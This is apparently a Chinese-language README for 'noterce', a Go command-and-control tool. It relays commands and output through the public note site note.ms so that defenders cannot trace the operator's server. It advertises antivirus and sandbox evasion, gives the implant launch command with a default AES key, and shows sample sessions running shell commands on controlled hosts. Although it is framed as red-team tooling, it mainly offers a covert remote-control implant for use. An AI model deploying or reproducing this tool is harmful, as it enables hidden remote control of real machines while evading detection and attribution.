# 分享个免杀-防止VPS被溯源-无VPS也可用的C2小工具



## 0x01工具介绍

- 该工具利用公开笔记本网站作为信息传递的中间服务器，能够让蓝队无法追溯到VPS的位置。
- 该工具未进行免杀处理，也未执行shell code，仅仅使用了go的os/exec包进行命令执行，并对其采用AES加密。
- 工具能够有效避免被大多数安全设备及态势感知系统发现，同时在多个杀毒软件中免杀。
- 在红队攻防活动中，作者针对需要隐藏C2回连地址及流量的需求，创造了该工具。

被控端微步在线扫描截图

![image-20230307201012383](images/image-20230307201012383.png)

![image-20230307201121221](images/image-20230307201121221.png)





1. 优点:
    - 具有免杀功能  
    - 可有效防止被溯源 
    - 实现了AES加密来保证信息的安全 
    - 对隐藏位置进行了深度优化 
    - 能够抵抗沙箱检测

2. 缺点:
    - 返回命令结果的速度较慢 
    - 功能较少（但敏感功能较少也降低了被检测的风险）



## 0x02 工具原理

1. 使用公开笔记网站 `https://note.ms/` 做中间服务器。uri `/ba`为一个笔记的地址，每个uri都对应一个笔记。

![image-20230307175854007](免杀-防止VPS被溯源-无VPS也可用的C2小工具.assets/image-20230307175854007.png)

2. 通过笔记本的读写来实现作为被控端和控制端之间的流量传递载体。具体的流程如下图所示：



![免杀-防止VPS被溯源-无VPS也可用的C2小工具.drawio](免杀-防止VPS被溯源-无VPS也可用的C2小工具.assets/免杀-防止VPS被溯源-无VPS也可用的C2小工具.drawio.png)







## 0x03工具利用

`client`为控制端 

`server`为被控端

### 被控端 `server`

被控端运行以下命令：

```bash
./server --key notekey --admin ocis
```

其中有两个参数，为了提高安全性，建议修改这两个参数：

- `key`：为AES加密的密钥，可自定义密钥。默认密钥为`zhu1234554321zhu`
- `admin`：控制的uri地址，默认为`ocis`

### 控制端 `client`

#### 1.控制端刷新在线主机列表

```
username$ ./client
0:主机名:[penetration]  note地址:[BpLnfgDsc3WD9F3qNfHK6a95jjJkwz]       notekey地址:[zhu1234554321zhu]


1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.更新别控端列表(需等待30秒)
```

#### 2.控制端执行命令



```
username$ ./client
1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.更新别控端列表(需等待30秒)


2
请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入shell命令:whoami
请等待30秒
jpass
1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.更新别控端列表(需等待30秒)


2
请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入shell命令:whoami
请等待30秒
jpass
```

## 0x04工具信息

工具地址:https://github.com/xiao-zhu-zhu/noterce

作者联系方式:`230300272@qq.com`

